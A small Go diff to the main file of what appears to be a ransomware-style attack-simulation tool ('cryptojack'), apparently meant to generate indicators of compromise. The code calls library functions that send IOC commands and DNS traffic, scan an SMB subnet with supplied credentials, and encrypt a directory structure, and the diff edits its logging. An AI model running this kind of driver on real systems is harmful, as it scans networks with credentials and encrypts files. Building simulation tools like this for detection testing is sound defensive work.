@@ -1,13 +1,12 @@
 package main
 
 import (
+	"cryptojack/cjlib"
 	"flag"
 	"fmt"
 	"math/rand"
 	"os"
 	"time"
-
-	"cryptojack/cjlib"
 )
 
 func main() {
@@ -74,13 +73,11 @@ __________________________________________________
         exclusions = config.Exclude
     }
 
-    fmt.Printf("\r\n\n[*] =============================================================\n")
-    fmt.Printf("[*]  Creating IOC Activity from [%s]\n", *arg_yaml)
-    fmt.Printf("[*] =============================================================\n")
+    // Shoot out some IOCS
     cjlib.Request_IOC_Commands(config)
-    //cjlib.Request_IOC_HTTP(config)
     cjlib.Request_IOC_DNS(config)
     cjlib.SMBScanSubnet(*arg_username, *arg_password, *arg_domain)
+
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
@@ -90,4 +87,5 @@ __________________________________________________
 		fmt.Printf("[-] %s\n", err.Error())
         os.Exit(1)
 	}
+    fmt.Println("[*] COMPLETED SUCCESSFULLY")
 }
